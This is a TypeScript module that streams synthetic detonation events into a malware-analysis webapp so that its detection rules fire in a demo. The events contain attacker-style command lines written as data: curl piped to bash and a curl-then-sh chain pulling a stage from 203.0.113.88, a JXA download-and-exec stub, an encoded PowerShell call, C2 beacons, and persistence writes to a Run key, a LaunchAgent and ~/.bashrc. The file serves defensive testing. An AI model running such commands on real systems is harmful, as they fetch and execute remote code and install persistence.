// Synthetic detonation scenarios — let the webapp demonstrate dynamic malware
// analysis fully standalone (no collector needed). Streams a realistic event
// sequence into a run via POST /ingest/batch; the detection engine fires the
// same rules it would for a real collector feed.
//
// Platform-aware (roadmap 1.2): the Windows scenario is a fake Office dropper;
// the Linux scenario is a bash → curl|sh download-and-exec chain. Each
// exercises that platform's own rules (registry Run keys vs ~/.bashrc,
// PowerShell -enc vs curl|sh, svchost paths vs /usr/bin/bash).

import type { EventIn, EventType, Platform } from "../types";

export interface DetonationBatch {
  /** Delay (ms) after the previous batch before this one is ingested. */
  delayMs: number;
  events: EventIn[];
}

function at(offsetSec: number): string {
  return new Date(Date.now() + offsetSec * 1000).toISOString();
}

export function detonationSampleName(platform: Platform): string {
  if (platform === "linux") return "detonate-demo.sh";
  if (platform === "macos") return "detonate-demo.app";
  return "detonate-demo.exe";
}

export function buildDetonationScenario(runId: string, platform: Platform = "windows"): DetonationBatch[] {
  if (platform === "linux") return buildLinuxScenario(runId);
  if (platform === "macos") return buildMacosScenario(runId);
  return buildWindowsScenario(runId);
}

// ---------------------------------------------------------------------------
// Windows — fake Office dropper (macro → LOLBin → C2 beacon → burst → Run key)
// ---------------------------------------------------------------------------
function buildWindowsScenario(runId: string): DetonationBatch[] {
  const ev = (
    ts: number,
    event_type: EventType,
    partial: Omit<Partial<EventIn>, "run_id" | "platform" | "timestamp" | "event_type">,
  ): EventIn => ({
    run_id: runId,
    platform: "windows",
    timestamp: at(ts),
    event_type,
    pid: null,
    ppid: null,
    process_name: null,
    command_line: null,
    dest_ip: null,
    dest_port: null,
    protocol: null,
    file_path: null,
    registry_key: null,
    ...partial,
  });

  // 5 beacon connections at a fixed 2s cadence → pstdev 0 → rule 4 fires.
  const beacons = [5, 7, 9, 11, 13].map((t) =>
    ev(t, "network_connection", { pid: 2002, dest_ip: "203.0.113.88", dest_port: 4444, protocol: "TCP" }),
  );

  // 12 file writes within 8 seconds → rule 6 fires (threshold 10).
  const fileBurst = Array.from({ length: 12 }, (_, i) =>
    ev(15 + i, "file_write", {
      pid: 2000,
      file_path: `C:\\Users\\victim\\Documents\\invoice_${String(i).padStart(3, "0")}.enc`,
    }),
  );

  return [
    {
      delayMs: 400,
      events: [
        ev(1, "process_create", {
          pid: 2000,
          ppid: 4,
          process_name: "winword.exe",
          command_line: "C:\\Users\\Public\\winword.exe /q /n",
        }),
      ],
    },
    {
      delayMs: 1400,
      events: [
        ev(3, "process_create", {
          pid: 2001,
          ppid: 2000,
          process_name: "powershell.exe",
          command_line: "powershell.exe -enc SQBFAFgAAGgBdAA=",
        }),
      ],
    },
    {
      delayMs: 1400,
      events: [
        ev(5, "process_create", {
          pid: 2002,
          ppid: 2000,
          process_name: "cmd.exe",
          command_line: "C:\\Windows\\System32\\cmd.exe /c whoami",
        }),
      ],
    },
    ...beacons.map((event, i) => ({ delayMs: i === 0 ? 1600 : 2000, events: [event] })),
    { delayMs: 1600, events: fileBurst },
    {
      delayMs: 1200,
      events: [
        ev(24, "registry_write", {
          pid: 2000,
          process_name: "winword.exe",
          registry_key: "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
        }),
      ],
    },
  ];
}

// ---------------------------------------------------------------------------
// macOS — JXA download-and-exec (roadmap 3.2):
//   osascript JXA → curl stage → C2 beacon → LaunchAgent plist persistence
// ---------------------------------------------------------------------------
function buildMacosScenario(runId: string): DetonationBatch[] {
  const ev = (
    ts: number,
    event_type: EventType,
    partial: Omit<Partial<EventIn>, "run_id" | "platform" | "timestamp" | "event_type">,
  ): EventIn => ({
    run_id: runId,
    platform: "macos",
    timestamp: at(ts),
    event_type,
    pid: null,
    ppid: null,
    process_name: null,
    command_line: null,
    dest_ip: null,
    dest_port: null,
    protocol: null,
    file_path: null,
    registry_key: null,
    ...partial,
  });

  // Same campaign C2 as the other platforms — macOS joins the same cluster.
  const beacons = [5, 7, 9, 11, 13].map((t) =>
    ev(t, "network_connection", { pid: 4002, dest_ip: "203.0.113.88", dest_port: 4444, protocol: "TCP" }),
  );

  return [
    {
      delayMs: 400,
      events: [
        // osascript with a JXA download-and-exec — the macOS LOLBin.
        ev(1, "process_create", {
          pid: 4000,
          ppid: 1,
          process_name: "osascript",
          command_line: "osascript -l JavaScript -e 'ObjC.import(\"Foundation\"); ...downloadAndExec()'",
        }),
      ],
    },
    {
      delayMs: 1400,
      events: [
        ev(3, "process_create", {
          pid: 4001,
          ppid: 4000,
          process_name: "curl",
          command_line: "curl -s http://203.0.113.88/stage.sh -o /tmp/.stage.sh",
        }),
      ],
    },
    {
      delayMs: 1200,
      events: [
        ev(4, "process_create", {
          pid: 4002,
          ppid: 4000,
          process_name: "sh",
          command_line: "sh /tmp/.stage.sh",
        }),
      ],
    },
    ...beacons.map((event, i) => ({ delayMs: i === 0 ? 1600 : 2000, events: [event] })),
    {
      delayMs: 1600,
      events: [
        // LaunchAgent plist — autostart persistence on macOS.
        ev(15, "file_write", {
          pid: 4000,
          process_name: "osascript",
          file_path: "/Users/victim/Library/LaunchAgents/com.apple.Updater.plist",
        }),
      ],
    },
  ];
}

// ---------------------------------------------------------------------------
// Linux — bash → curl|sh chain (fake downloader):
//   /tmp/bash -i → sh -c 'curl | bash' → C2 beacon → file burst → ~/.bashrc
// ---------------------------------------------------------------------------
function buildLinuxScenario(runId: string): DetonationBatch[] {
  const ev = (
    ts: number,
    event_type: EventType,
    partial: Omit<Partial<EventIn>, "run_id" | "platform" | "timestamp" | "event_type">,
  ): EventIn => ({
    run_id: runId,
    platform: "linux",
    timestamp: at(ts),
    event_type,
    pid: null,
    ppid: null,
    process_name: null,
    command_line: null,
    dest_ip: null,
    dest_port: null,
    protocol: null,
    file_path: null,
    registry_key: null,
    ...partial,
  });

  // Same C2 as the Windows sample — the shared-IP campaign story stays one.
  const beacons = [5, 7, 9, 11, 13].map((t) =>
    ev(t, "network_connection", { pid: 3002, dest_ip: "203.0.113.88", dest_port: 4444, protocol: "TCP" }),
  );

  const fileBurst = Array.from({ length: 12 }, (_, i) =>
    ev(15 + i, "file_write", {
      pid: 3000,
      file_path: `/tmp/invoice_${String(i).padStart(3, "0")}.enc`,
    }),
  );

  return [
    {
      delayMs: 400,
      events: [
        // bash from /tmp — masquerading (expected /usr/bin/bash).
        ev(1, "process_create", {
          pid: 3000,
          ppid: 1,
          process_name: "bash",
          command_line: "/tmp/bash -i",
        }),
      ],
    },
    {
      delayMs: 1400,
      events: [
        // curl piped to bash — LOLBin (download-and-exec).
        ev(3, "process_create", {
          pid: 3001,
          ppid: 3000,
          process_name: "sh",
          command_line: "sh -c 'curl -s http://203.0.113.88/x.sh | bash'",
        }),
      ],
    },
    {
      delayMs: 1200,
      events: [
        // The C2 client itself — curl. Spawning it makes the process tree
        // complete (bash → sh → curl) so the network-actor node exists in the
        // tree and its risk halo (203.0.113.88, suspicious) can attach.
        ev(4, "process_create", {
          pid: 3002,
          ppid: 3001,
          process_name: "curl",
          command_line: "curl -s http://203.0.113.88/x.sh",
        }),
      ],
    },
    ...beacons.map((event, i) => ({ delayMs: i === 0 ? 1600 : 2000, events: [event] })),
    { delayMs: 1600, events: fileBurst },
    {
      delayMs: 1200,
      events: [
        // Persistence via ~/.bashrc — autostart-persistence rule.
        ev(24, "file_write", {
          pid: 3000,
          process_name: "bash",
          file_path: "/home/victim/.bashrc",
        }),
      ],
    },
  ];
}
